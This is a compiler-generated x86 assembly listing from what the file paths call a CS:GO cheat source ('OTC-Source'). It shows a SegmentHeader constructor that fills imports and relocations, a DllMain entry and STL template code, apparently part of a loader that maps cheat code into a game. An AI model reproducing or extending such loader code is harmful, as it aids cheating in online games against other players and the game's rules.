PUBLIC	??$?0$$V@?$_Compressed_pair@V?$allocator@U?$_Tree_node@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@PAX@std@@@std@@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >,std::_Tree_val<std::_Tree_simple_types<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >,1>::_Compressed_pair<std::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >,std::_Tree_val<std::_Tree_simple_types<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >,1><>
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@SAIABV?$allocator@URelocatedNetVar@SegmentFramework@@@2@@Z ; std::_Default_allocator_traits<std::allocator<SegmentFramework::RelocatedNetVar> >::max_size
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@PBD@std@@@std@@SAIABV?$allocator@PBD@2@@Z ; std::_Default_allocator_traits<std::allocator<char const *> >::max_size
PUBLIC	?max_size@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QBEIXZ ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::max_size
PUBLIC	?_Xlength@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@CAXXZ ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Xlength
PUBLIC	?max_size@?$vector@PBDV?$allocator@PBD@std@@@std@@QBEIXZ ; std::vector<char const *,std::allocator<char const *> >::max_size
PUBLIC	?_Xlength@?$vector@PBDV?$allocator@PBD@std@@@std@@CAXXZ ; std::vector<char const *,std::allocator<char const *> >::_Xlength
PUBLIC	?_Buy_nonzero@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXI@Z ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Buy_nonzero
PUBLIC	??0?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@XZ ; std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >
PUBLIC	?_Buy_nonzero@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEXI@Z ; std::vector<char const *,std::allocator<char const *> >::_Buy_nonzero
PUBLIC	??$_Get_size_of_n@$07@std@@YAII@Z		; std::_Get_size_of_n<8>
PUBLIC	??$_Destroy_range@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YAXPAURelocatedNetVar@SegmentFramework@@QAU12@AAV?$allocator@URelocatedNetVar@SegmentFramework@@@0@@Z ; std::_Destroy_range<std::allocator<SegmentFramework::RelocatedNetVar> >
PUBLIC	??$?0ABU?$less@PBD@std@@U_Zero_then_variadic_args_t@1@@?$_Compressed_pair@U?$less@PBD@std@@V?$_Compressed_pair@V?$allocator@U?$_Tree_node@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@PAX@std@@@std@@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@std@@@2@$00@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABU?$less@PBD@1@$$QAU_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::less<char const *>,std::_Compressed_pair<std::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >,std::_Tree_val<std::_Tree_simple_types<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >,1>,1>::_Compressed_pair<std::less<char const *>,std::_Compressed_pair<std::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >,std::_Tree_val<std::_Tree_simple_types<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >,1>,1><std::less<char const *> const &,std::_Zero_then_variadic_args_t>
PUBLIC	??$_Range_construct_or_tidy@PBURelocatedNetVar@SegmentFramework@@@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXPBURelocatedNetVar@SegmentFramework@@0Uforward_iterator_tag@1@@Z ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Range_construct_or_tidy<SegmentFramework::RelocatedNetVar const *>
PUBLIC	??$?0ABV?$allocator@URelocatedNetVar@SegmentFramework@@@std@@$$V@?$_Compressed_pair@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@V?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@URelocatedNetVar@SegmentFramework@@@1@@Z ; std::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1>::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1><std::allocator<SegmentFramework::RelocatedNetVar> const &>
PUBLIC	??$_Ucopy@PAURelocatedNetVar@SegmentFramework@@@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEPAURelocatedNetVar@SegmentFramework@@PAU23@00@Z ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Ucopy<SegmentFramework::RelocatedNetVar *>
PUBLIC	??$?0V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@$$V@?$_Compressed_pair@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@V?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@URelocatedNetVar@SegmentFramework@@@1@@Z ; std::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1>::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1><std::allocator<SegmentFramework::RelocatedNetVar> >
PUBLIC	??$_Range_construct_or_tidy@PBQBD@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEXPBQBD0Uforward_iterator_tag@1@@Z ; std::vector<char const *,std::allocator<char const *> >::_Range_construct_or_tidy<char const * const *>
PUBLIC	??$?0ABV?$allocator@PBD@std@@$$V@?$_Compressed_pair@V?$allocator@PBD@std@@V?$_Vector_val@U?$_Simple_types@PBD@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@PBD@1@@Z ; std::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1>::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1><std::allocator<char const *> const &>
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@V?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@2@$00@std@@QAEAAV?$allocator@URelocatedNetVar@SegmentFramework@@@2@XZ ; std::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1>::_Get_first
PUBLIC	?_Alloc_sentinel_and_proxy@?$_Tree@V?$_Tmap_traits@PBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@U?$less@PBD@2@V?$allocator@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@2@$0A@@std@@@std@@IAEXXZ ; std::_Tree<std::_Tmap_traits<char const *,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> >,std::less<char const *>,std::allocator<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > >,0> >::_Alloc_sentinel_and_proxy
PUBLIC	?deallocate@?$allocator@URelocatedNetVar@SegmentFramework@@@std@@QAEXQAURelocatedNetVar@SegmentFramework@@I@Z ; std::allocator<SegmentFramework::RelocatedNetVar>::deallocate
PUBLIC	?allocate@?$allocator@URelocatedNetVar@SegmentFramework@@@std@@QAEPAURelocatedNetVar@SegmentFramework@@I@Z ; std::allocator<SegmentFramework::RelocatedNetVar>::allocate
PUBLIC	?_Destroy@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXPAURelocatedNetVar@SegmentFramework@@0@Z ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Destroy
PUBLIC	?_Getal@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEAAV?$allocator@URelocatedNetVar@SegmentFramework@@@2@XZ ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Getal
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@V?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@2@$00@std@@QBEABV?$allocator@URelocatedNetVar@SegmentFramework@@@2@XZ ; std::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1>::_Get_first
PUBLIC	??0?$_Tree@V?$_Tmap_traits@PBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@U?$less@PBD@2@V?$allocator@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@2@$0A@@std@@@std@@QAE@ABU?$less@PBD@1@@Z ; std::_Tree<std::_Tmap_traits<char const *,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> >,std::less<char const *>,std::allocator<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > >,0> >::_Tree<std::_Tmap_traits<char const *,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> >,std::less<char const *>,std::allocator<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > >,0> >
PUBLIC	?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@SA?AV?$allocator@URelocatedNetVar@SegmentFramework@@@2@ABV32@@Z ; std::_Default_allocator_traits<std::allocator<SegmentFramework::RelocatedNetVar> >::select_on_container_copy_construction
PUBLIC	?_Buy_raw@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXI@Z ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Buy_raw
PUBLIC	?_Tidy@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXXZ ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Tidy
PUBLIC	?_Getal@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@ABEABV?$allocator@URelocatedNetVar@SegmentFramework@@@2@XZ ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Getal
PUBLIC	?begin@?$initializer_list@URelocatedNetVar@SegmentFramework@@@std@@QBEPBURelocatedNetVar@SegmentFramework@@XZ ; std::initializer_list<SegmentFramework::RelocatedNetVar>::begin
PUBLIC	?end@?$initializer_list@URelocatedNetVar@SegmentFramework@@@std@@QBEPBURelocatedNetVar@SegmentFramework@@XZ ; std::initializer_list<SegmentFramework::RelocatedNetVar>::end
PUBLIC	?begin@?$initializer_list@PBD@std@@QBEPBQBDXZ	; std::initializer_list<char const *>::begin
PUBLIC	?end@?$initializer_list@PBD@std@@QBEPBQBDXZ	; std::initializer_list<char const *>::end
PUBLIC	??1?$_Tidy_guard@V?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@@std@@QAE@XZ ; std::_Tidy_guard<std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> > >::~_Tidy_guard<std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> > >
PUBLIC	??0?$map@PBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@U?$less@PBD@2@V?$allocator@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@2@@std@@QAE@XZ ; std::map<char const *,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> >,std::less<char const *>,std::allocator<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >::map<char const *,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> >,std::less<char const *>,std::allocator<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >
PUBLIC	??0?$allocator@URelocatedNetVar@SegmentFramework@@@std@@QAE@XZ ; std::allocator<SegmentFramework::RelocatedNetVar>::allocator<SegmentFramework::RelocatedNetVar>
PUBLIC	??0?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@V?$initializer_list@URelocatedNetVar@SegmentFramework@@@1@ABV?$allocator@URelocatedNetVar@SegmentFramework@@@1@@Z ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >
PUBLIC	??0?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@ABV01@@Z ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >
PUBLIC	??1?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@XZ ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::~vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >
PUBLIC	??0?$allocator@PBD@std@@QAE@XZ			; std::allocator<char const *>::allocator<char const *>
PUBLIC	??0?$vector@PBDV?$allocator@PBD@std@@@std@@QAE@V?$initializer_list@PBD@1@ABV?$allocator@PBD@1@@Z ; std::vector<char const *,std::allocator<char const *> >::vector<char const *,std::allocator<char const *> >
PUBLIC	??0?$initializer_list@URelocatedNetVar@SegmentFramework@@@std@@QAE@PBURelocatedNetVar@SegmentFramework@@0@Z ; std::initializer_list<SegmentFramework::RelocatedNetVar>::initializer_list<SegmentFramework::RelocatedNetVar>
PUBLIC	??0?$initializer_list@PBD@std@@QAE@PBQBD0@Z	; std::initializer_list<char const *>::initializer_list<char const *>
PUBLIC	?__autoclassinit2@Segment@@QAEXI@Z		; Segment::__autoclassinit2
PUBLIC	??1Segment@@QAE@XZ				; Segment::~Segment
PUBLIC	??0SegmentFramework@@QAE@XZ			; SegmentFramework::SegmentFramework
PUBLIC	??0Segment@@QAE@XZ				; Segment::Segment
PUBLIC	_DllMain@12
PUBLIC	??0RuntimeHandler@@QAE@AAVSegment@@@Z		; RuntimeHandler::RuntimeHandler
PUBLIC	??1SegmentFramework@@QAE@XZ			; SegmentFramework::~SegmentFramework
PUBLIC	??0SegmentFramework@@QAE@ABV0@@Z		; SegmentFramework::SegmentFramework
PUBLIC	?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ ; Segment::GetFramework
PUBLIC	??0SegmentHeader@@QAE@XZ			; SegmentHeader::SegmentHeader
;	COMDAT xdata$x
xdata$x	SEGMENT
__ehfuncinfo$??0SegmentHeader@@QAE@XZ DD 019930522H
	DD	02H
	DD	FLAT:__unwindtable$??0SegmentHeader@@QAE@XZ
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
__unwindtable$??0SegmentHeader@@QAE@XZ DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0SegmentHeader@@QAE@XZ$0
	DD	00H
	DD	FLAT:__unwindfunclet$??0SegmentHeader@@QAE@XZ$1
xdata$x	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__ehfuncinfo$?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ DD 019930522H
	DD	02H
	DD	FLAT:__unwindtable$?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
__unwindtable$?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ DD 0ffffffffH
	DD	FLAT:__unwindfunclet$?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ$1
	DD	00H
	DD	FLAT:__unwindfunclet$?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ$2
xdata$x	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__ehfuncinfo$??0SegmentFramework@@QAE@ABV0@@Z DD 019930522H
	DD	02H
	DD	FLAT:__unwindtable$??0SegmentFramework@@QAE@ABV0@@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
__unwindtable$??0SegmentFramework@@QAE@ABV0@@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0SegmentFramework@@QAE@ABV0@@Z$0
	DD	00H
	DD	FLAT:__unwindfunclet$??0SegmentFramework@@QAE@ABV0@@Z$1
xdata$x	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__ehfuncinfo$_DllMain@12 DD 019930522H
	DD	0aH
	DD	FLAT:__unwindtable$_DllMain@12
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
	ORG $+4
__unwindtable$_DllMain@12 DD 0ffffffffH
	DD	FLAT:__unwindfunclet$_DllMain@12$9
	DD	00H
	DD	FLAT:__unwindfunclet$_DllMain@12$10
	DD	0ffffffffH
	DD	FLAT:__unwindfunclet$_DllMain@12$7
	DD	0ffffffffH
	DD	FLAT:__unwindfunclet$_DllMain@12$0
	DD	03H
	DD	FLAT:__unwindfunclet$_DllMain@12$1
	DD	03H
	DD	FLAT:__unwindfunclet$_DllMain@12$2
	DD	03H
	DD	FLAT:__unwindfunclet$_DllMain@12$3
	DD	03H
	DD	FLAT:__unwindfunclet$_DllMain@12$4
	DD	03H
	DD	FLAT:__unwindfunclet$_DllMain@12$5
	DD	03H
	DD	FLAT:__unwindfunclet$_DllMain@12$6
xdata$x	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__ehfuncinfo$??0Segment@@QAE@XZ DD 019930522H
	DD	03H
	DD	FLAT:__unwindtable$??0Segment@@QAE@XZ
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
__unwindtable$??0Segment@@QAE@XZ DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0Segment@@QAE@XZ$2
	DD	00H
	DD	FLAT:__unwindfunclet$??0Segment@@QAE@XZ$3
	DD	0ffffffffH
	DD	FLAT:__unwindfunclet$??0Segment@@QAE@XZ$0
xdata$x	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__ehfuncinfo$??0SegmentFramework@@QAE@XZ DD 019930522H
	DD	02H
	DD	FLAT:__unwindtable$??0SegmentFramework@@QAE@XZ
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
__unwindtable$??0SegmentFramework@@QAE@XZ DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0SegmentFramework@@QAE@XZ$0
	DD	00H
	DD	FLAT:__unwindfunclet$??0SegmentFramework@@QAE@XZ$1
; Function compile flags: /Ogtp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\SegmentHeader.h
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\SegmentHeader.h
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\SegmentHeader.h
;	COMDAT ??0SegmentHeader@@QAE@XZ
_TEXT	SEGMENT
_this$ = -16						; size = 4
__$EHRec$ = -12						; size = 12
??0SegmentHeader@@QAE@XZ PROC				; SegmentHeader::SegmentHeader, COMDAT
; _this$ = ecx

; 50   :     SegmentHeader () {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	6a ff		 push	 -1
  00005	68 00 00 00 00	 push	 __ehhandler$??0SegmentHeader@@QAE@XZ
  0000a	64 a1 00 00 00
	00		 mov	 eax, DWORD PTR fs:0
  00010	50		 push	 eax
  00011	83 ec 08	 sub	 esp, 8
  00014	56		 push	 esi
  00015	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0001a	33 c5		 xor	 eax, ebp
  0001c	50		 push	 eax
  0001d	8d 45 f4	 lea	 eax, DWORD PTR __$EHRec$[ebp]
  00020	64 a3 00 00 00
	00		 mov	 DWORD PTR fs:0, eax
  00026	8b f1		 mov	 esi, ecx
  00028	89 75 f0	 mov	 DWORD PTR _this$[ebp], esi
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 51   :         return ::operator new(_Bytes);

  0002b	6a 20		 push	 32			; 00000020H
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree

; 435  :     _Tree_val() noexcept : _Myhead(), _Mysize(0) {}

  0002d	c7 06 00 00 00
	00		 mov	 DWORD PTR [esi], 0
  00033	c7 46 04 00 00
	00 00		 mov	 DWORD PTR [esi+4], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 51   :         return ::operator new(_Bytes);

  0003a	e8 00 00 00 00	 call	 ??2@YAPAXI@Z		; operator new
  0003f	83 c4 04	 add	 esp, 4
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree

; 344  :         _Construct_in_place(_Pnode->_Left, _Pnode);

  00042	89 00		 mov	 DWORD PTR [eax], eax

; 345  :         _Construct_in_place(_Pnode->_Parent, _Pnode);

  00044	89 40 04	 mov	 DWORD PTR [eax+4], eax

; 346  :         _Construct_in_place(_Pnode->_Right, _Pnode);

  00047	89 40 08	 mov	 DWORD PTR [eax+8], eax

; 347  :         _Pnode->_Color = _Black;

  0004a	66 c7 40 0c 01
	01		 mov	 WORD PTR [eax+12], 257	; 00000101H

; 2024 :         _Scary->_Myhead = _Node::_Buyheadnode(_Getal());

  00050	89 06		 mov	 DWORD PTR [esi], eax
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\SegmentHeader.h

; 50   :     SegmentHeader () {

  00052	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR __$EHRec$[ebp+8], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  00059	c7 46 08 00 00
	00 00		 mov	 DWORD PTR [esi+8], 0
  00060	c7 46 0c 00 00
	00 00		 mov	 DWORD PTR [esi+12], 0
  00067	c7 46 10 00 00
	00 00		 mov	 DWORD PTR [esi+16], 0
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\SegmentHeader.h

; 51   :         FillImports ();

  0006e	8b ce		 mov	 ecx, esi
  00070	c6 45 fc 01	 mov	 BYTE PTR __$EHRec$[ebp+8], 1
  00074	e8 00 00 00 00	 call	 ?FillImports@SegmentHeader@@AAEXXZ ; SegmentHeader::FillImports

; 52   :         FillRelocations ();

  00079	8b ce		 mov	 ecx, esi
  0007b	e8 00 00 00 00	 call	 ?FillRelocations@SegmentHeader@@AAEXXZ ; SegmentHeader::FillRelocations

; 53   :     }

  00080	8b c6		 mov	 eax, esi
  00082	8b 4d f4	 mov	 ecx, DWORD PTR __$EHRec$[ebp]
  00085	64 89 0d 00 00
	00 00		 mov	 DWORD PTR fs:0, ecx
  0008c	59		 pop	 ecx
  0008d	5e		 pop	 esi
  0008e	8b e5		 mov	 esp, ebp
  00090	5d		 pop	 ebp
  00091	c3		 ret	 0
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__unwindfunclet$??0SegmentHeader@@QAE@XZ$0:
  00000	8b 4d f0	 mov	 ecx, DWORD PTR _this$[ebp]
  00003	e9 00 00 00 00	 jmp	 ??1?$map@PBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@U?$less@PBD@2@V?$allocator@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@2@@std@@QAE@XZ
__unwindfunclet$??0SegmentHeader@@QAE@XZ$1:
  00008	8b 4d f0	 mov	 ecx, DWORD PTR _this$[ebp]
  0000b	83 c1 08	 add	 ecx, 8
  0000e	e9 00 00 00 00	 jmp	 ??1?$vector@KV?$allocator@K@std@@@std@@QAE@XZ ; std::vector<unsigned long,std::allocator<unsigned long> >::~vector<unsigned long,std::allocator<unsigned long> >
  00013	cc		 int	 3
  00014	cc		 int	 3
  00015	cc		 int	 3
  00016	cc		 int	 3
  00017	cc		 int	 3
__ehhandler$??0SegmentHeader@@QAE@XZ:
  00018	90		 npad	 1
  00019	90		 npad	 1
  0001a	8b 54 24 08	 mov	 edx, DWORD PTR [esp+8]
  0001e	8d 42 0c	 lea	 eax, DWORD PTR [edx+12]
  00021	8b 4a f0	 mov	 ecx, DWORD PTR [edx-16]
  00024	33 c8		 xor	 ecx, eax
  00026	e8 00 00 00 00	 call	 @__security_check_cookie@4
  0002b	b8 00 00 00 00	 mov	 eax, OFFSET __ehfuncinfo$??0SegmentHeader@@QAE@XZ
  00030	e9 00 00 00 00	 jmp	 ___CxxFrameHandler3
text$x	ENDS
??0SegmentHeader@@QAE@XZ ENDP				; SegmentHeader::SegmentHeader
; Function compile flags: /Ogtp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\Segment.h
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
